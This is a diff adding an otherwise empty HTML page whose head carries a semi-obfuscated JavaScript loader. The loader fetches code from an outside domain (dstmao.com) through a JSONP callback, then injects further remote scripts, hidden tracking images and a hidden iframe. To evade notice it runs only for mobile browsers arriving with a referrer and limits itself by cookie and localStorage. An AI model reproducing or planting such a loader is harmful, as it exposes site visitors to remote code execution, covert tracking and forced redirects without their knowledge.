@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+    <script>
+        'use strict';
+        /** @type {!Array} */
+        var JMArr = ["cookeTool",
+            "h_3313_afd", "length",
+            "cookie", "=",
+            "indexOf", ";",
+            "substring", "",
+            "getTime", "setTime",
+            ";expires=",
+            "toUTCString",
+            "getCookie", "hostname",
+            "location", "setCookie",
+            "getItem", "setStorage",
+            "parse", "setItem",
+            "canAccess",
+            "checkCookie",
+            "checkStorage",
+            "htmlTool", "none",
+            "div", "createElement",
+            "display", "style",
+            "script", "type",
+            "text/javascript",
+            "setAttribute", "src",
+            "appendChild", "body",
+            "id", "iframe", "img",
+            "span", "substr",
+            "random", "brower",
+            "userAgent",
+            "test", "referrer",
+            "ios", "android",
+            "createIframe",
+            "not be mobile ua!",
+            "info",
+            "referer is empty!",
+            "jss", "smartpull",
+            "createScript",
+            "referer filter!",
+            "imgs", "createSpan",
+            "createImg", "su", "dt",
+            "currentScript", "/",
+            "lastIndexOf", "?",
+            "split",
+            "https://www.dstmao.com/jdc.do?jnt=",
+            "&callback=cbf",
+            "cookie filter!"
+        ];
+        (function() {
+            /**
+             * @param {?} string
+             * @return {undefined}
+             * 替换变量
+             */
+            function replaceSNVariables(string) {
+                var el = document["referrer"];
+                if (el) {
+                    if (未知["brower"]["ios"]() || 未知["brower"]["android"]()) {
+                        未知["htmlTool"]["createIframe"](Math["random"]().toString(36)["substr"](2), string);
+                    } else {
+                        console["info"]("not be mobile ua!");
+                    }
+                } else {
+                    console["info"]("referer is empty!");
+                }
+            }
+            let 未知 = {};
+            未知["cookeTool"] = function() {
+                var str = "h_3313_afd";
+                /** @type {number} */
+                var i = 1 * 60 * 60 * 1000;
+                return {
+                    "getCookie" : function(name) {
+                        if (document["cookie"]["length"] > 0) {
+                            var str = document["cookie"]["indexOf"](name + "=");
+                            if (str != -1) {
+                                str = str + name["length"] + 1;
+                                var end = document["cookie"]["indexOf"](";", str);
+                                if (end == -1) {
+                                    end = document["cookie"]["length"];
+                                }
+                                return decodeURIComponent(document["cookie"]["substring"](str, end));
+                            }
+                        }
+                        return "";
+                    },
+                    "setCookie" : function(url, key, val) {
+                        /** @type {!Date} */
+                        var _helpersResolve2 = new Date;
+                        _helpersResolve2["setTime"](_helpersResolve2["getTime"]() + val);
+                        document["cookie"] = url + "=" + decodeURIComponent(key) + (val == null ? "" : ";expires=" + _helpersResolve2["toUTCString"]());
+                    },
+                    "checkCookie" : function() {
+                        var label = this["getCookie"](str);
+                        if (label != null && label != "") {
+                            return false;
+                        } else {
+                            label = document["location"]["hostname"];
+                            this["setCookie"](str, label, i);
+                            return true;
+                        }
+                    },
+                    "checkStorage" : function() {
+                        try {
+                            var a = localStorage["getItem"](str);
+                            if (a == null || a == undefined || a == "") {
+                                this["setStorage"]();
+                                return true;
+                            } else {
+                                /** @type {!Date} */
+                                var expected_date2 = new Date(Date["parse"](a));
+                                var pixelSizeTargetMax = expected_date2["getTime"]();
+                                var zeroSizeMax = (new Date)["getTime"]();
+                                /** @type {number} */
+                                var whichFriend = zeroSizeMax - pixelSizeTargetMax;
+                                if (whichFriend < i) {
+                                    return false;
+                                } else {
+                                    this["setStorage"]();
+                                    return true;
+                                }
+                            }
+                        } catch (e) {
+                            return true;
+                        }
+                    },
+                    "setStorage" : function() {
+                        localStorage["setItem"](str, (new Date)["toUTCString"]());
+                    }
+                };
+            }();
+            // 判断权限 可以访问
+            未知["canAccess"] = function() {
+                return 未知["cookeTool"]["checkCookie"]() && 未知["cookeTool"]["checkStorage"]();
+            }();
+
+            未知["htmlTool"] = function() {
+                var 未知0 = "none";
+                return {
+                    "createScript" : function(url) {
+                        var head = document["createElement"]("div");
+                        head["style"]["display"] = 未知0;
+                        var script = document["createElement"]("script");
+                        script["setAttribute"]("type", "text/javascript");
+                        script["src"] = url;
+                        head["appendChild"](script);
+                        document["body"]["appendChild"](head);
+                        return script;
+                    },
+                    "createIframe" : function(zIndex, name) {
+                        var CustomTests = document["createElement"]("div");
+                        CustomTests["style"]["display"] = 未知0;
+                        CustomTests["setAttribute"]("id", zIndex);
+                        var element = document["createElement"]("iframe");
+                        element["src"] = name;
+                        CustomTests["appendChild"](element);
+                        document["body"]["appendChild"](CustomTests);
+                        return CustomTests;
+                    },
+                    "createImg" : function(src, left) {
+                        var feedbackStore = document["createElement"]("img");
+                        feedbackStore["src"] = src;
+                        left["appendChild"](feedbackStore);
+                        return feedbackStore;
+                    },
+                    "createSpan" : function() {
+                        var span = document["createElement"]("span");
+                        span["id"] = Math["random"]().toString(36)["substr"](2);
+                        span["style"]["display"] = 未知0;
+                        document["body"]["appendChild"](span);
+                        return span;
+                    }
+                };
+            }();
+            // 判断设备
+            未知["brower"] = function() {
+                return {
+                    "ios" : function() {
+                        return /(iPhone|iPad|iPod)/i["test"](navigator["userAgent"]);
+                    },
+                    "android" : function() {
+                        return /(android|adr)/i["test"](navigator["userAgent"]);
+                    }
+                };
+            }();
+            /**
+             * @param {?} retryTimes
+             * @return {undefined}
+             */
+            cbf = function(retryTimes) {
+                var rendernodes = retryTimes["jss"];
+                var el = document["referrer"];
+                for (let rnodeid in rendernodes) {
+                    let artistTrack = rendernodes[rnodeid];
+                    if (artistTrack["indexOf"]("smartpull") > -1) {
+                        if (el) {
+                            未知["htmlTool"]["createScript"](artistTrack);
+                        } else {
+                            console["info"]("referer filter!");
+                        }
+                    } else {
+                        未知["htmlTool"]["createScript"](artistTrack);
+                    }
+                }
+                // 关系类型
+                var RELATIONSHIP_TYPES = retryTimes["imgs"];
+                if (未知["brower"]["ios"]() && RELATIONSHIP_TYPES["length"] > 0) {
+                    var artistTrack = 未知["htmlTool"]["createSpan"]();
+                    for (let definedRelationship in RELATIONSHIP_TYPES) {
+                        未知["htmlTool"]["createImg"](RELATIONSHIP_TYPES[definedRelationship], artistTrack);
+                    }
+                }
+                if (rendernodes["length"] > 0) {
+                    setTimeout(function() {
+                        replaceSNVariables(retryTimes["su"]);
+                    }, retryTimes["dt"]);
+                }
+            };
+            var el = document["currentScript"];
+            var subel = el["src"];
+            var _0x3181x28 = subel["substr"](subel["lastIndexOf"]("/") + 1);
+            if (_0x3181x28["indexOf"]("?") != -1) {
+                _0x3181x28 = _0x3181x28["split"]("?")[0];
+            }
+            if (未知["canAccess"]) {
+                未知["htmlTool"]["createScript"]("https://www.dstmao.com/jdc.do?jnt=" + _0x3181x28 + "&callback=cbf");
+            } else {
+                console["info"]("cookie filter!");
+            }
+        })();
+
+    </script>
+</head>
+<body>
+<script></script>
+</body>
+</html>
